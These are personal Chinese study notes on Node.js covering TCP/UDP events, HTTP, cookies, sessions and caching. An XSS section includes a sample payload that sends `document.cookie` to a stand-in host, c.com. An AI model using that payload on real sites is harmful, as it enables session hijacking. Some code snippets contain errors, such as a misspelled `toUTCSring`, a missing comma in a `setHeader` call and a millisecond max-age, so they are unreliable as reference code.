# 深入浅出`nodejs`
#### 关于`package.json`的一些描述
* `devDependencies:` 开发依赖
* `dependencies:` 生产依赖
#### `npm`安装包时几种标志

* `-g`:  是将一个包安装为全局可用的可执行命令
* `--save || -S`:  对生产环境所依赖的声明(开发中使用的框架,库), 对应`dependencies`
* `--save-dev || -D`: 开发环境所需依赖的声明(构建工具,测试工具),对应`devDependencies`

#### 高阶函数和偏函数
* 高阶函数:  把函数作为参数或返回值的函数
* 偏函数: 通过制定部分参数来产生一个新的定制函数的形式就是偏函数

```JavaScript
function type(t) { 
  return function (o) { 
    return Object.prototype.toString.call(o) === '[object '+t+']'
  }
}
const isString = type('String')
const isFunction = type('Function')
```

#### 垃圾回收

> 函数调用,`with`和全局作用域会形成作用域. 一个变量再当前作用域内查找不到时, 就会向上级查找, 直到全局作用域为止. 但是中间一旦找到,则不再向上查找.这种链式称为作用域链  

* 闭包:  实现外部作用域访问内部作用域中变量的方法叫做闭包
* 再删除对象的属性时使用赋值(`null||undefined`)的方法比使用`delete`要好(使用`delete`会干扰`V8`引擎的优化)
* 无法立即回收的内存有闭包和全局变量引用这俩种情况. 因此在使用的时候要小心

##### `node`使用内存有限制, 因此操作大文件时, 要注意. 可以使用流的形式, 超出内存会溢出,照成内存泄露

### 网络相关的知识
> 下面是网络相关的协议分类  
![](%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%60nodejs%60/WechatIMG11265.png)


### `TCP`:

> 是面相连接的协议,显著特征是在传输之前需要3次握手形成对话.只有会话完成,服务端和客户端才能相互发送数据.  断开链接时,需要四次挥手  
>   
#### `TCP`服务器事件

> `net.createServer()`创建的服务器, 是一个`EventEmitter`实例,自定义事件有如下几种  
* `listening`: 再调用`server.listen(port, listeningListener)`或者`Domain Socket`后触发
* `conection`: 每个客户端套接字连接到服务器端时触发,简介写法为通过`net.createServer()`最后一个参数传递
* `close`: 当服务器关闭时触发, 在调用`server.close()`后, 服务器将停止接受新的套接字连接, 但保持当前存在的连接,等待所有连接都断开后, 会触发事件
* `error`: 当服务器发生异常时, 将会触发该事件. 

#### `TCP`连接事件

> 服务端和客户端可以通过`data`事件读取另一端的数据,也可以通过`write`方法从一端向另一端发送数据  

* `data`: 当一端调用`write`发送数据时, 另一端会触发`data`事件,事件传递的数据就是`write()`发送的数据
* `end`: 当连接中的任意一端发送了`FIN`数据时,将会触发该事件
* `connect`: 该事件作用于客户端,当套接字与服务端连接成功时会触发
* `drain`: 当任意一端调用`write`发送数据时,当前这端会触发该事件
* `error`: 当异常发生时, 触发该事件
* `timeout`: 当一定时间后连接不在活跃时, 该事件将会被触发,通知用户当前该连接已经被闲置了

### `UDP`

> 又称用户数据包协议,与`TCP`一样同属于网络传输层. `UDP`与`TCP`最大的不同是`UDP`不是面相连接的. `TCP`一旦建立, 所有的会话都基于连接完成,  
客户端如果要与另一个`TCP`服务通信,需要另创建一个套接字来完成连接. 但在`UDP`中, 一个套接字可以与多个`UDP`服务通信, 它虽然提供面向事物的简单不可靠信息传输服务, 再网络差的情况下存在丢包严重的问题(使用的场景有音频和视频等, 这种偶尔丢一俩个数据包也不会产生重大的影响的场景)

#### `UDP`套接字事件

* `messgae`: 当`UDP`套接字侦听网卡端口后,接收到消息时触发该事件,触发携带的数据为消息`Buffer`对象和一个远程地址信息
* `listening`: 当`UDP`套接字开始侦听时触发该事件
* `close`: 调用`close()`方法时触发该事件 , 并不再触发`message`事件.如需再次触发`message`事件,需要重新绑定
* `error`: 当异常发生时触发该事件, 如果不侦听, 异常将直接退出, 使进程退出


### `http`

#### 初识`http`

> `http`: 全称是超文本传输协议. `http`构建在`tcp`之上,属于应用层协议. 在`HTTP`的俩端是服务器和浏览器, 即著名的`B/S`模式  
* `Http`服务只做俩件事,处理`http`请求和发送`http`请求
* `HTTP`既可以做服务端又可以做客户端

#### 构建`WEB`应用

* 请求的方法: `GET,POST,HEAD,DELETE,PUT,CONNECT`
	* `GET`:  查看一个资源
	* `DELETE`; 删除一个资源
	* `POST`: 修改一个资源
	* `PUT`:  增加一个资源
* 路径解析: 位于 请求报文的请求行中
	* 完整的`URL`: `http://user:pass@host.com:8080/p/a/t/h?query=sting#hash`
		* 协议-用户-域名-端口—虚拟目录部分-文件名部分-query参数-哈希
		* 虚拟目录: 从域名后的第一个`/`到最后一个`/`为止
		* 文件名: 最后一个`/`和`?`之间的部分
* 查询字符串: 位于`?`之后`#`之前的部分
	* 再请求报文的请求行中(`method url http-version`)
	* `node`中处理这部分数据的模块: `url, querystring`

```JavaScript
const url = require('url')
...
const query = url.parse(req.url, true).query // 获取query参数组成的json对象

// 但是如果查询字符串中的键出现多次,那么它的值会是一个数组. 因此在处理的时候, 要对字段的值做一些判断(是字符串还是数组)
```

* `Cookie`
	* `HTTTP`是一个无状态的协议, 现实中的业务是需要有一定的状态的.
	* `cookie`的处理分为一下几步
		* 服务器端向客户端发送`Cookie`
		* 浏览器将`cookie`保存
		* 之后每次浏览器都会将`cookie`发向服务器端
	* 响应的`Cookie`值在`Set-Cookie`中
		* `Set-Cookie: name=value; Path=/;Expires=Sun,23-Apr-23 09:01:35 GMT; Domain=.domain.com`
		* `name=value`是必须包含的部分,其它都是可选的
		* `path`: 表示这个`Cookie`影响到的路径
		* `Expires和Max-Age`: 过期时间. 如果不设置,浏览器关闭就会丢失这个cookie
			* `Expires`: `UTC`格式的时间字符串, 告知浏览器何时过期
			* `Max-Age:` 告知浏览器多久后过期(防止浏览器和服务器时间不同步)
			* `HttpOnly`:  告知浏览器不允许通过脚本`document.cookie`去更改这个`Cookie`值
			* `Secure`: 值为true时,在`HTTP`中是无效的,在`HTTPS`中才有效
		* `Cookie`的性能影响:  设置`cookie`后, 该域下的每次请求都会携带`cookie`, 但是大多数请求是用不到的, 会造成带宽的部分浪费
			* 减少`Cookie`的大小
			* 为静态组件使用不同的域名
			* 减少`DNS`查询(浏览器会进行`DNS`缓存,可以削弱这个副作用的影响)
		* `document.cookie`: 前端可以通过这个拿到`cookie`信息,进行修改和使用

```JavaScript
// node 中设置cookie
res.setHeader('Set-Cookie', serialize('isVisit' ,'1'))

// 也可以同时设置多条cookie
res.setHeader('Set-Cookie'[serialize('isVisit' ,'1'),serialize('age' ,'18')])

function serialize(name,val,opt) {
	const pairs = [name + '=' + encode(val)]
	opt = opt || {}
	
	if(opt.maxAge) pairs.push('Max-age='+ opt.maxAge)
	if(opt.domain) pairs.push('Domain=' + opt.domain)
	if(opt.path) pairs.push('Path=' + opt.path)
	if(opt.expires) pairs.push('Expires=' + opt.expires.toUTCSring())
	if(opt.httpOnly)  pairs.push('HttpOnly')
	if(opt.secure)  pairs.push('secure');

	return pairs.join('; ')
}
```

#### `session`: 数据只保留在服务器端,客户端无法修改

* 基于`cookie`来实现用户和数据的映射

```JavaScript
const http = require('http')
const sessions = {}
const EXPIRES = 20 * 60 * 1000
http.createServer((req, res) => {
  req.cookies = parseCookie(req.headers.cookie)
  const writeHead = res.writeHead

  res.writeHead = function () { 
    let cookies = res.getHeader('Set-Cookie') || ''
    const session = serialize('id', req.session.id)
    cookies = Array.isArray(cookies) ? cookies.concat(session) : [session]
    this.setHeader('Set-Cookie', cookies)
    return writeHead.apply(this, arguments)
  }
  res.setHeader("Access-Control-Allow-Origin", "*")
  handlerCookie(req, res)
}).listen(8000, () => { 
  console.log('服务器启动完成')
  });

function handlerCookie(req, res) {
  const id = req.cookies.id
  if (!id) {
    req.session = generate()
  } else { 
    const session = sessions[id]
    if (session) {
      if (session.cookie.expire > Date.now()) {
        session.cookie.expire = Date.now() + EXPIRES
        req.session = session
      } else {
        delete sessions[id]
        req.session = generate()
      }
    } else { 
      req.session = generate()
    }
  }
  handler(req,res)
 }

function generate() { 
  const session = {}
  session.id = Date.now() + Math.random()
  session.cookie = {
    expire: Date.now() + EXPIRES
  }
  sessions[session.id] = session
  return session
}

function parseCookie(cookies='') { 
  const ret = {}
  const list = cookies.split(';')
  for (const item of list) { 
    const current = item.split('=')
    ret[current[0]] = current[1]
  }
  return ret
}
function handler(req, res) {
  if (!req.session.isVisit) {
    req.session.isVisit = true
    res.writeHead(200, {'Content-Type':'text/plain'})
    res.end('欢迎第一次来到动物园')
  } else { 
    res.writeHead(200, {'Content-Type': 'text/plain'})
    res.end('动物园再次欢迎你')
  }
}
function serialize(name,val,opt) {
	const pairs = [name + '=' + val]
	opt = opt || {}
	
	if(opt.maxAge) pairs.push('Max-age='+ opt.maxAge)
	if(opt.domain) pairs.push('Domain=' + opt.domain)
	if(opt.path) pairs.push('Path=' + opt.path)
	if(opt.expires) pairs.push('Expires=' + opt.expires.toUTCSring())
	if(opt.httpOnly)  pairs.push('HttpOnly')
	if(opt.secure)  pairs.push('secure');

	return pairs.join('; ')
}
```

* 通过查询字符串来实现浏览器和服务器端数据的对应
	* 原理是检查请求的查询字符串, 如果没有值,会先生成新的带值的`URL`, 然后形成跳转, 让客户端重新发起请求

#### `XSS`漏铜: 全称是跨站脚本攻击,主要形成原因是用户的输入没有被转义,而被直接执行
* 比如这样的`url`
	* `http://a.com/pathname#<script src="http://b.com/c.js"></script>`
* 新加载的脚本可以是
	* `location.href = "http://c.com?"+document.cookie`

#### 缓存
* 几条缓存的规则
	* 添加`Expires`或`Cache-Control`到报文头中
	* 配置`ETags`
	* 让`Ajax`可缓存
* 大多数缓存只应用在`GET`请求中
	* 本地没有文件时,浏览器必然会请求服务器中的内容,并将这部分内容放在本地的某个缓存目录中. 再第二次请求时,它将对本地文件进行检查,如果不确定这份本地文件是否可以直接使用,他将会发起一个条件请求.(再请求报文中附带`If-Modified-Since`字段)
		* `If-Modified-Since: Sun, 03 Feb 2013 06:01:12 GMT`
		* 如果服务器没有新的版本,只需响应一个`304`状态码即可.否则发送更新的文件到客户端
![](%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%60nodejs%60/1544436210540.jpg)

* 设置`Expires`: 在服务器端设置`Expires`可以告知浏览器要缓存文件内容

```JavaScript
const handle = function() {
    fs.readFile(filename, (err, file)=>{
        const expires = new Date()
        expires.setTime(expires.getTime() +10*365*24*60*60*1000)
        res.setHeader('Expires', expires.toUTCString())
        res.writeHead(200, 'ok')
        res.end(file)
    })
}
```

* 可以使用`Cache-Control`实现相同的功能.并且可以避免浏览器端与服务器端时间不同步带来的不一致性问题,只要进行类似倒计时的方式计算时间即可
	* 此外`Cache-Control`的值还能设置`public,private,no-cache,no-store`能够更精细地控制缓存的选项

```JavaScript
const handle = function(req, res) {
    fs.readFile(filename, (err,file)=>{
        res.setHeader('Cache-Control', 'max-age='+10*365*24*60*60*1000)
        res.writeHead(200, 'ok')
        res.end(file)
    })
}
```

#### 清除缓存

* 我们使用缓存时也要为其设定版本号,所幸浏览器是根据`URL`进行缓存. 更新机制有如下俩种

	* 每次发布,路径中跟随`web`应用的版本号`http://url.com/?v=20180808`
	* 每次发布,路径中跟随文件内容的`hash`值`http://url.com/?hash=afadfadwe`

#### 数据上传
* `get`: 请求, 把数据放在请求的报文中
* `表单提交`
* `post`:
* `文件提交`:

####  `Basic` 认证
> 当客户端与服务器端进行请求时, 允许通过用户名和密码实现的一种身份认证方式  
* 请求中携带用户的信息

#### ` MVC`
*  `MVC`模型的主要思想是将业务逻辑按职责分离, 主要分为一下几种:
	* 控制器`Controller`: 一组行为的集合
		* 路由解析, 根据`URL`寻找到对应的控制器和行为
	* 模型`Model`: 数据相关的操作和封装
		* 行为调用相关的模型,进行数据操作
	* 视图`View`: 视图的渲染 
		* 数据操作结束后,调用视图和相关数据进行页面渲染,输出到客户端
#mydiary/node#
